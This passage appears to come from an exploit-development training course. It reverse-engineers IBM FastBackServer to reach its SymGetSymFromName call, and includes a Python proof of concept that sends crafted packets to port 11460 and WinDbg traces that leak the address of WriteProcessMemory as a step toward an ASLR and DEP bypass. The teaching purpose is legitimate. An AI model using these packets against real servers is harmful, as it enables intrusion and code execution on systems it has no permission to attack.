This is definitely a good start since now we know that the opcode value of 0x2000 will trigger the 
correct code path, but we have not yet determined the buffer contents required to reach the 
correct basic block inside FXCLI_DebugDispatch. 
Our next goal is to develop a proof of concept that will trigger the SymGetSymFromName call 
inside FXCLI_DebugDispatch. We’ll reuse our basic proof of concept from the previous modules, 
and update the opcode value. 
import socket 
import sys 
from struct import pack 
 
# psAgentCommand 
buf = bytearray([0x41]*0xC) 
buf += pack("<i", 0x2000)  # opcode 
buf += pack("<i", 0x0)    # 1st memcpy: offset 
buf += pack("<i", 0x100)  # 1st memcpy: size field 
buf += pack("<i", 0x100)  # 2nd memcpy: offset 
buf += pack("<i", 0x100)  # 2nd memcpy: size field 
buf += pack("<i", 0x200)  # 3rd memcpy: offset 
buf += pack("<i", 0x100)  # 3rd memcpy: size field 
buf += bytearray([0x41]*0x8) 
 
# psCommandBuffer 
buf += b"A" * 0x100 
buf += b"B" * 0x100 
buf += b"C" * 0x100 
 
# Checksum 
buf = pack(">i", len(buf)-4) + buf 
 
def main(): 
    if len(sys.argv) != 2: 
        print("Usage: %s <ip_address>\n" % (sys.argv[0])) 
        sys.exit(1) 
     
    server = sys.argv[1] 
    port = 11460 
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.connect((server, port)) 
 
    s.send(buf) 
    s.close() 
 
    print("[+] Packet sent") 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
443 
    sys.exit(0) 
 
 
if __name__ == "__main__": 
    main() 
Listing 524 - Basic proof of concept to reach opcode 0x2000 
Our modified proof of concept uses the opcode value 0x2000 along with a psCommandbuffer 
consisting of 0x100 As, Bs, and Cs, as displayed in Listing 524. 
Since WinDbg is already attached to FastBackServer, we can place a breakpoint on the 
comparison of the opcode value. Because WDEG cannot randomize the base address of 
FastBackServer, we can continue using the static addresses found in IDA Pro for our breakpoint. 
Next, let’s launch our proof of concept. 
0:067> bp 0x56d1ef 
 
0:067> g 
Breakpoint 0 hit 
eax=0609c8f0 ebx=0609c418 ecx=00002000 edx=00000001 esi=0609c418 edi=00669360 
eip=0056d1ef esp=0d47e334 ebp=0d4dfe98 iopl=0         nv up ei pl nz ac po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212 
FastBackServer!FXCLI_OraBR_Exec_Command+0xd39: 
0056d1ef 81bdd0e4f9ff00200000 cmp dword ptr [ebp-61B30h],2000h 
ss:0023:0d47e368=00002000 
Listing 525 - Breaking at opcode 0x2000 comparison 
From the highlighted values in Listing 525, it is evident that our proof of concept and prior 
analysis were correct. We have reached the branching statement leading to the code path of 
opcode 0x2000. 
We can now single-step through the comparison to the call into FXCLI_DebugDispatch. We’ll 
dump the arguments here, as shown in Listing 526. 
eax=0d4d3b30 ebx=0609c418 ecx=018e43a8 edx=0d4d3b2c esi=0609c418 edi=00669360 
eip=0057381c esp=0d47e328 ebp=0d4dfe98 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
FastBackServer!FXCLI_OraBR_Exec_Command+0x7366: 
0057381c e85fa30000      call    FastBackServer!FXCLI_DebugDispatch (0057db80) 
 
0:006> dd esp L3 
0d47e328  018e43a8 0d4d3b30 0d4d3b2c 
 
0:006> dd 0d4d3b30  
0d4d3b30  41414141 41414141 41414141 41414141 
0d4d3b40  41414141 41414141 41414141 41414141 
0d4d3b50  41414141 41414141 41414141 41414141 
0d4d3b60  41414141 41414141 41414141 41414141 
0d4d3b70  41414141 41414141 41414141 41414141 
0d4d3b80  41414141 41414141 41414141 41414141 
0d4d3b90  41414141 41414141 41414141 41414141 
0d4d3ba0  41414141 41414141 41414141 41414141 
Listing 526 - psCommandBuffer as argument to FXCLI_DebugDispatch 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
444 
The first part of psCommandBuffer consists of 0x41s. This means that the second argument to 
FXCLI_DebugDispatch is under our control. 
In summary, we discovered that the target application uses the SymGetSymFromName API, 
which we may be able to leverage to bypass ASLR. We also created a proof of concept enabling 
us to reach the function that invokes SymGetSymFromName. 
In the next section, we’ll navigate FXCLI_DebugDispatch to determine how we can resolve the 
address of an arbitrary Win32 API. 
10.2.1.1 Exercises 
1. 
Repeat the analysis that leads to locating FXCLI_DebugDispatch. 
2. 
Craft a proof of concept that allows you to call FXCLI_DebugDispatch. 
10.2.2 
Arbitrary Symbol Resolution 
Now, we’re ready to step into FXCLI_DebugDispatch to determine how to reach the correct basic 
block. 
As mentioned, FXCLI_DebugDispatch is a large function. The graph overview from IDA Pro is 
repeated in Figure 149. 
 
Figure 154: Graph layout of FXCLI_DebugDispatch 
The figure above also reveals many branching statements within the function. These types of 
branching code paths are typically the result of if and else statements in the C source code. 
When we start to trace through the function, we discover a repeating pattern that begins from the 
first basic block. 
The code of the first basic block from FXCLI_DebugDispatch is shown in Figure 155. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
445 
 
Figure 155: First basic block of FXCLI_DebugDispatch 
In the first highlighted portion of the basic block, FXCLI_DebugDispatch calls _ml_strbytelen. This 
is a wrapper function around strlen,353 a function that finds the length of the string given as an 
argument. 
The argument string in this case is “help”, which means _ml_strbytelen should return the value “4”. 
Next, FXCLI_DebugDispatch calls _ml_strnicmp, which is a wrapper around strnicmp.354 This API 
compares two strings up to a maximum number of characters, ignoring the case. 
In our case, the maximum number of characters to compare is the result of the _ml_strbytelen 
function, which is the value “4”. That means _ml_strnicmp performs a comparison between “help” 
and the contents at the memory address in Str1. 
We can verify our static analysis and obtain the contents of the unknown string by single-stepping 
until the call to ml_strnicmp and inspecting the API’s three arguments: 
eax=0d4d3b30 ebx=0609c418 ecx=0085dbe4 edx=7efefeff esi=0609c418 edi=00669360 
eip=0057dbae esp=0d47da30 ebp=0d47e320 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!FXCLI_DebugDispatch+0x2e: 
0057dbae e8c4d40d00      call    FastBackServer!ml_strnicmp (0065b077) 
 
0:006> dd esp L3 
0d47da30  0d4d3b30 0085dbec 00000004 
 
0:006> da 0085dbec  
0085dbec  "help" 
 
0:006> da 0d4d3b30  
0d4d3b30  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d4d3b50  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
 
353 (Microsoft, 2020), https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/strlen-wcslen-mbslen-mbslen-l-mbstrlen-
mbstrlen-l?view=msvc-160 
354 (Microsoft, 2020), https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/strnicmp-wcsnicmp-mbsnicmp-strnicmp-l-
wcsnicmp-l-mbsnicmp-l?view=msvc-160 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
446 
0d4d3b70  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d4d3b90  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d4d3bb0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d4d3bd0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d4d3bf0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d4d3c10  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d4d3c30  "" 
Listing 527 - String compare operation on our input 
The output confirms that the maximum size argument contains the value “4”. We also observe 
that the dynamic string comes from the psCommandBuffer, which is under our control. 
Since the first four characters of the strings do not match, the API returns a non-zero value: 
0:006> r eax 
eax=ffffffff 
 
0:006> p 
eax=ffffffff ebx=0609c418 ecx=ffffffff edx=0d4d2030 esi=0609c418 edi=00669360 
eip=0057dbb6 esp=0d47da3c ebp=0d47e320 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!FXCLI_DebugDispatch+0x36: 
0057dbb6 85c0            test    eax,eax 
 
0:006> p 
eax=ffffffff ebx=0609c418 ecx=ffffffff edx=0d4d2030 esi=0609c418 edi=00669360 
eip=0057dbb8 esp=0d47da3c ebp=0d47e320 iopl=0         nv up ei ng nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286 
FastBackServer!FXCLI_DebugDispatch+0x38: 
0057dbb8 0f85fd010000    jne     FastBackServer!FXCLI_DebugDispatch+0x23b (0057ddbb) 
[br=1] 
Listing 528 - Comparison and jump due to string compare 
The return value is used in a TEST instruction, along with a JNE. Because the return value is non-
zero, we execute the jump. 
From here, the ml_strnicmp call we have just analyzed is repeated for different strings in a series 
of if and else statements visually represented in the graph overview. Figure 156 shows the next 
two string comparisons. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
447 
 
Figure 156: String comparisons 
As we will soon confirm, these basic assembly blocks can be translated to a series of branch 
statements in C. When each string comparison succeeds, it leads to the invocation of a 
FastBackServer internal function. 
Now that we understand the high level flow of the function, let’s speed up our analysis by 
navigating to the basic block just prior to the SymGetSymFromName call. Here we find the 
comparison shown in Figure 157. 
 
Figure 157: First basic block of FXCLI_DebugDispatch 
Based on the comparison, we know that our input string must be equal to “SymbolOperation”. 
We can pass the comparison by updating our proof of concept, as shown in Listing 529. 
... 
# psCommandBuffer 
buf += b"SymbolOperation" 
buf += b"A" * (0x100 - len("SymbolOperation")) 
buf += b"B" * 0x100 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
448 
buf += b"C" * 0x100 
... 
Listing 529 - Updated input buffer to pass comparison 
We’ll set the input buffer to the string “SymbolOperation” followed by A’s. 
Next, we’ll clear any previous breakpoints in WinDbg, set a breakpoint on the call to ml_strnicmp 
at 0x57e84a, and continue execution. We’ll reach the breakpoint we just set with old data from 
our previous proof of concept, so we need to continue execution once more before launching the 
updated proof of concept. 
When the updated proof of concept is executed, we trigger the breakpoint. 
Breakpoint 0 hit 
eax=0000000f ebx=0602bd30 ecx=0085e930 edx=0d563b30 esi=0602bd30 edi=00669360 
eip=0057e84a esp=0d50da30 ebp=0d50e320 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!FXCLI_DebugDispatch+0xcca: 
0057e84a e828c80d00      call    FastBackServer!ml_strnicmp (0065b077) 
 
0:001> da poi(esp) 
0d563b30  "SymbolOperationAAAAAAAAAAAAAAAAA" 
0d563b50  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d563b70  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d563b90  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d563bb0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d563bd0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d563bf0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d563c10  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d563c30  "" 
 
0:001> p 
eax=00000000 ebx=0602bd30 ecx=00000000 edx=0d562030 esi=0602bd30 edi=00669360 
eip=0057e84f esp=0d50da30 ebp=0d50e320 iopl=0         nv up ei pl nz ac pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216 
FastBackServer!FXCLI_DebugDispatch+0xccf: 
0057e84f 83c40c          add     esp,0Ch 
 
0:001> r eax 
eax=00000000 
Listing 530 - Passing string comparison 
Since we submitted the correct string, the TEST instruction will ensure we take the code path 
leading to the SymGetSymFromName call. 
Let’s set a breakpoint on the call to SymGetSymFromName at 0x57e984 and continue execution. 
0:001> bp 0057e984 
 
0:001> g 
Breakpoint 1 hit 
eax=ffffffff ebx=0602bd30 ecx=0d50da8c edx=0d50dca0 esi=0602bd30 edi=00669360 
eip=0057e984 esp=0d50da30 ebp=0d50e320 iopl=0         nv up ei ng nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286 
FastBackServer!FXCLI_DebugDispatch+0xe04: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
449 
0057e984 ff15e4e76700    call    dword ptr [FastBackServer!_imp__SymGetSymFromName 
(0067e7e4)] ds:0023:0067e7e4={dbghelp!SymGetSymFromName (6dbfea10)} 
Listing 531 - Call to SymGetSymFromName 
As shown in the listing, our proof of concept reaches the call to SymGetSymFromName. Next, we 
need to understand its arguments so we can resolve a function address. 
Let’s review the function prototype355 (shown in Listing 532). 
BOOL IMAGEAPI SymGetSymFromName( 
  HANDLE           hProcess, 
  PCSTR            Name, 
  PIMAGEHLP_SYMBOL Symbol 
); 
Listing 532 - Function prototype for SymGetSymFromName 
Specifically, we’ll explore the last two arguments. The second argument, Name, is a pointer to the 
symbol name that will be resolved. It must be provided as a null-terminated string. 
We can check the current content of the second argument with WinDbg. 
eax=ffffffff ebx=0602bd30 ecx=0d50da8c edx=0d50dca0 esi=0602bd30 edi=00669360 
eip=0057e984 esp=0d50da30 ebp=0d50e320 iopl=0         nv up ei ng nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286 
FastBackServer!FXCLI_DebugDispatch+0xe04: 
0057e984 ff15e4e76700    call    dword ptr [FastBackServer!_imp__SymGetSymFromName 
(0067e7e4)] ds:0023:0067e7e4={dbghelp!SymGetSymFromName (6dbfea10)} 
 
0:079> da poi(esp+4) 
0d50da8c  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d50daac  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
... 
Listing 533 - Second argument for SymGetSymFromName 
From Listing 533, we discover that the second argument is our input string that was appended to 
the “SymbolOperation” string. 
This means we can provide the name of an arbitrary Win32 API and have its address resolved by 
SymGetSymFromName. Very nice. 
The last argument is a structure of type PIMAGEHLP_SYMBOL,356 as shown in Listing 534. 
typedef struct _IMAGEHLP_SYMBOL { 
  DWORD SizeOfStruct; 
  DWORD Address; 
  DWORD Size; 
  DWORD Flags; 
  DWORD MaxNameLength; 
  CHAR  Name[1]; 
} IMAGEHLP_SYMBOL, *PIMAGEHLP_SYMBOL; 
Listing 534 - IMAGEHLM_SYMBOL structure 
 
355 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/dbghelp/nf-dbghelp-symgetsymfromname 
356 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/api/dbghelp/ns-dbghelp-imagehlp_symbol 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
450 
This structure is initialized within the same basic block (address 0x57E957) and populated by 
SymGetSymFromName. We are interested in the second field of this structure, which will contain 
the resolved API’s memory address returned by SymGetSymFromName. If all goes well, we’ll later 
use this address to bypass ASLR. 
Let’s try to resolve the memory address of an API by updating our proof of concept to contain the 
name of the Win32 WriteProcessMemory API, which we can use to bypass DEP. 
# psCommandBuffer 
symbol = b"SymbolOperationWriteProcessMemory" + b"\x00" 
buf += symbol + b"A" * (100 - len(symbol)) 
buf += b"B" * 0x100 
buf += b"C" * 0x100 
Listing 535 - Updated proof of concept with WriteProcessMemory function name 
We’ll remove the breakpoint on the call to ml_strnicmp at 0x57e84a and let execution continue. 
Now we’re ready to execute the updated proof of concept. 
0:077> bc 0 
 
0:077> g 
Breakpoint 0 hit 
eax=ffffffff ebx=0608c418 ecx=0db5da8c edx=0db5dca0 esi=0608c418 edi=00669360 
eip=0057e984 esp=0db5da30 ebp=0db5e320 iopl=0         nv up ei ng nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286 
FastBackServer!FXCLI_DebugDispatch+0xe04: 
0057e984 ff15e4e76700    call    dword ptr [FastBackServer!_imp__SymGetSymFromName 
(0067e7e4)] ds:0023:0067e7e4={dbghelp!SymGetSymFromName (6dbfea10)} 
 
0:079> da poi(esp+4) 
0db5da8c  "WriteProcessMemory" 
Listing 536 - WriteProcessMemory as input to SymGetSymFromName 
This reveals the expected input string, “WriteProcessMemory”. 
Before executing SymGetSymFromName, we’ll dump the contents of the address field in the 
PIMAGEHLP_SYMBOL structure. 
0:079> dd esp+8 L1 
0db5da38  0db5dca0 
 
0:079> dds 0db5dca0+4 L1 
0db5dca4  00000000 
 
0:079> p 
eax=00000001 ebx=0608c418 ecx=36be0505 edx=00020b40 esi=0608c418 edi=00669360 
eip=0057e98a esp=0db5da3c ebp=0db5e320 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FXCLI_DebugDispatch+0xe0a: 
0057e98a 898574f9ffff    mov     dword ptr [ebp-68Ch],eax ss:0023:0db5dc94=00000001 
 
0:079> dds 0db5dca0+4 L1 
0db5dca4  75342890 KERNEL32!WriteProcessMemoryStub 
Listing 537 - Resolving WriteProcessMemory with SymGetSymFromName 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
451 
When we inspect the contents of the second field in the PIMAGEHLP_SYMBOL structure before 
the call, we find it is empty (0x000000). 
However, after the call to SymGetSymFromName, we notice that it has been populated by the API 
and contains the address of WriteProcessMemory. 
From our last test, it seems that we should be able to abuse the FXCLI_DebugDispatch function. 
However, we still have to determine if we are able to read the results returned by 
SymGetSymFromName from the network. If we can, we should be able to bypass ASLR and 
combine that with a DEP bypass through ROP to obtain code execution. 
10.2.2.1 Exercises 
1. 
Repeat the analysis leading to the execution of SymGetSymFromFile. 
2. 
Craft a proof of concept that resolves WriteProcessMemory and verify that it works by 
setting a breakpoint on the call to SymGetSymFromFile. 
10.2.3 
Returning the Goods 
We 
know 
that 
we 
can 
trigger 
the 
execution 
of 
SymGetSymFromName 
through 
FXCLI_DebugDispatch and resolve the address of an arbitrary function. Next, we need to figure 
out how to retrieve the values. 
Our input triggers SymGetSymFromName through a network packet. It makes sense that, for the 
functionality to be useful, there will be a code path that returns the value to us. To find this code 
path, we must continue our reverse engineering effort. 
First, we must navigate our way out of the FXCLI_DebugDispatch function. Let’s inspect the return 
value of SymGetSymFromName to determine which path is taken next. 
0:077> r eax 
eax=00000001 
 
0:077> p 
eax=00000001 ebx=0608c418 ecx=36be0505 edx=00020b40 esi=0608c418 edi=00669360 
eip=0057e990 esp=0db5da3c ebp=0db5e320 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FXCLI_DebugDispatch+0xe10: 
0057e990 83bd74f9ffff00  cmp     dword ptr [ebp-68Ch],0 ss:0023:0db5dc94=00000001 
 
0:077> p 
eax=00000001 ebx=0608c418 ecx=36be0505 edx=00020b40 esi=0608c418 edi=00669360 
eip=0057e997 esp=0db5da3c ebp=0db5e320 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FXCLI_DebugDispatch+0xe17: 
0057e997 0f8495060000    je      FastBackServer!FXCLI_DebugDispatch+0x14b2 (0057f032) 
[br=0] 
Listing 538 - Inspecting the return value from SymGetSymFromName 
The highlighted jump instruction is not executed because the return value is non-null. 
Next, we encounter a large basic block that performs several string manipulations. The first of 
these manipulations is displayed in Figure 158. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
452 
 
Figure 158: String manipulations on output 
We can observe that the output of the sprintf call is stored on the stack at an offset from 
EBP+arg_0. Two more calls to sprintf follow, where the output is stored at an offset from 
EBP+arg_0. 
We’re only interested in the final string, so we can dump the storage address at EBP+arg_0 and 
inspect it at the end of the basic block. To find the value of arg_0, we’ll first navigate to the start of 
FXCLI_DebugDispatch. 
 
Figure 159: Numerical value of arg_0 
Since arg_0 translates to the value “8”, we can dump the contents of EBP+8 at the start of the 
basic block: 
0:077> dd ebp+8 L1 
0db5e328  00ede3a8 
Listing 539 - Contents of arg_0 
Next, let’s set a breakpoint on the TEST instruction at 0x57ea23, which is at the end of the basic 
block where sprintf is called three times. 
After we hit the breakpoint, we find the final contents of the string buffer. 
0:077> bp 0057ea23 
 
0:077> g 
Breakpoint 0 hit 
eax=ffffffff ebx=0608c418 ecx=0085ea04 edx=0db5db8c esi=0608c418 edi=00669360 
eip=0057ea23 esp=0db5da3c ebp=0db5e320 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!FXCLI_DebugDispatch+0xea3: 
0057ea23 85c0            test    eax,eax 
 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
453 
0:077> da 00ede3a8 
00ede3a8  "XpressServer: SymbolOperation .-" 
00ede3c8  "------------------------------ ." 
00ede3e8  "Value of [WriteProcessMemory] is" 
00ede408  ": ..Address is: 0x75342890 .Flag" 
00ede428  "s are: 0x207 .Size is : 0x20 ." 
Listing 540 - Text output from FXCLI_DebugDispatch 
Listing 540 shows that the buffer contains, among other things, the memory address of 
WriteProcessMemory. 
At this point the execution leads us to the end of the function where we return to 
FXCLI_OraBR_Exec_Command (address 0x573821, Figure 160) just after the call to 
FXCLI_DebugDispatch. 
 
Figure 160: Return to FXCLI_OraBR_Exec_Command from FXCLI_DebugDispatch 
The first comparison after returning is a NULL check of EAX, which is the return value from 
FXCLI_DebugDispatch. 
To find the return value, we can let the function return in WinDbg and dump EAX. 
0:077> r eax 
eax=00000001 
 
0:077> p 
eax=00000001 ebx=0608c418 ecx=0000009e edx=0db5db8c esi=0608c418 edi=00669360 
eip=0057382a esp=0db5e334 ebp=0dbbfe98 iopl=0         nv up ei pl nz ac po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212 
FastBackServer!FXCLI_OraBR_Exec_Command+0x7374: 
0057382a 83bddcdafeff00  cmp     dword ptr [ebp-12524h],0 ss:0023:0dbad974=00000001 
 
0:077> p 
eax=00000001 ebx=0608c418 ecx=0000009e edx=0db5db8c esi=0608c418 edi=00669360 
eip=00573831 esp=0db5e334 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FXCLI_OraBR_Exec_Command+0x737b: 
00573831 740c            je      FastBackServer!FXCLI_OraBR_Exec_Command+0x7389 
(0057383f) [br=0] 
 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
454 
0:077> p 
eax=00000001 ebx=0608c418 ecx=0000009e edx=0db5db8c esi=0608c418 edi=00669360 
eip=00573833 esp=0db5e334 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FXCLI_OraBR_Exec_Command+0x737d: 
00573833 c785b4dafeff01000000 mov dword ptr [ebp-1254Ch],1 ss:0023:0dbad94c=00000000 
Listing 541 - Value 1 in temporary variable 
As shown in the listing above, the return value in EAX is 1, so the jump is not taken. 
Following execution, we’ll eventually reach the basic block shown in Figure 161. 
 
Figure 161: Many code paths leading to basic block 
This figure shows many code paths converging at this address. 
The comparison in this basic block is performed against a variable we do not control. To learn 
what happens at runtime, we need to single-step in WinDbg until we reach the basic block shown 
in Figure 161. 
eax=00000001 ebx=0608c418 ecx=0000009e edx=0db5db8c esi=0608c418 edi=00669360 
eip=00575a62 esp=0db5e334 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FXCLI_OraBR_Exec_Command+0x95ac: 
00575a62 83bde4dafeff00  cmp     dword ptr [ebp-1251Ch],0 ss:0023:0dbad97c=00000000 
 
0:077> p 
eax=00000001 ebx=0608c418 ecx=0000009e edx=0db5db8c esi=0608c418 edi=00669360 
eip=00575a69 esp=0db5e334 ebp=0dbbfe98 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
FastBackServer!FXCLI_OraBR_Exec_Command+0x95b3: 
00575a69 0f84ec000000    je      FastBackServer!FXCLI_OraBR_Exec_Command+0x96a5 
(00575b5b) [br=1] 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
455 
 
0:077> p 
eax=00000001 ebx=0608c418 ecx=0000009e edx=0db5db8c esi=0608c418 edi=00669360 
eip=00575b5b esp=0db5e334 ebp=0dbbfe98 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
FastBackServer!FXCLI_OraBR_Exec_Command+0x96a5: 
00575b5b 83bdb8dafeff00  cmp     dword ptr [ebp-12548h],0 ss:0023:0dbad950=00000001 
 
0:077> p 
eax=00000001 ebx=0608c418 ecx=0000009e edx=0db5db8c esi=0608c418 edi=00669360 
eip=00575b62 esp=0db5e334 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FXCLI_OraBR_Exec_Command+0x96ac: 
00575b62 0f8494010000    je      FastBackServer!FXCLI_OraBR_Exec_Command+0x9846 
(00575cfc) [br=0] 
Listing 542 - Two comparisons to local variables 
The first jump is taken (as shown in Listing 542), after which we encounter another comparison. 
This branch also uses a variable that is out of our control, and the second jump is not taken. 
Next, we arrive at the basic block displayed in Figure 162. 
 
Figure 162: Basic block with call to FX_AGENT_S_GetConnectedIpPort 
The key point in this block is the call to FX_AGENT_S_GetConnectedIpPort. Keeping in mind our 
goal of returning the results from SymGetSymFromName to us via a network packet, this function 
name seems promising. 
Observing this basic block more closely, the addresses in ECX and EDX come from an LEA 
instruction. When this instruction is used just before a CALL, it typically indicates that the memory 
address stored in the register (ECX and EDX in this case) is used to return the output of the 
invoked function. Let’s verify this. 
We’ll continue to the function call and then dump the memory of the two stack variables pointed 
to by the LEA instructions, before and after the call. 
eax=0608c8f0 ebx=0608c418 ecx=04fd0020 edx=0dbb9cdc esi=0608c418 edi=00669360 
eip=00575b80 esp=0db5e328 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FXCLI_OraBR_Exec_Command+0x96ca: 
00575b80 e85cc70000      call    FastBackServer!FX_AGENT_S_GetConnectedIpPort 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
456 
(005822e1) 
 
0:077> dd ebp-12550 L1 
0dbad948  00000000 
 
0:077> dd ebp-61BC L1 
0dbb9cdc  00000000 
 
0:077> p 
eax=00000001 ebx=0608c418 ecx=04fd0020 edx=8eb020d0 esi=0608c418 edi=00669360 
eip=00575b85 esp=0db5e328 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FXCLI_OraBR_Exec_Command+0x96cf: 
00575b85 83c40c          add     esp,0Ch 
 
0:077> dd ebp-12550 L1 
0dbad948  000020d0 
 
0:077> dd ebp-61BC L1 
0dbb9cdc  7877a8c0 
Listing 543 - Resolving IP and port of Kali 
From Listing 543, we notice that the two memory locations passed as arguments through the 
LEA instructions are indeed populated during this call. Let’s try to understand what these values 
represent. 
Because of the function’s name, we can guess that these values relate to an existing IP address 
and port. Typically, a TCP connection is created by calling the connect357 API, which has the 
function prototype shown in Listing 544. 
int WSAAPI connect( 
  SOCKET         s, 
  const sockaddr *name, 
  int            namelen 
); 
Listing 544 - Function prototype for connect 
The second argument in this function prototype is a structure called sockaddr. In IP version 4, this 
structure is called sockaddr_in.358 
Listing 545 displays the structure of sockaddr_in as documented on MSDN. 
struct sockaddr_in { 
        short   sin_family; 
        u_short sin_port; 
        struct  in_addr sin_addr; 
        char    sin_zero[8]; 
}; 
Listing 545 - Sockaddr_in structure 
 
357 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/api/winsock2/nf-winsock2-connect 
358 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/winsock/sockaddr-2 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
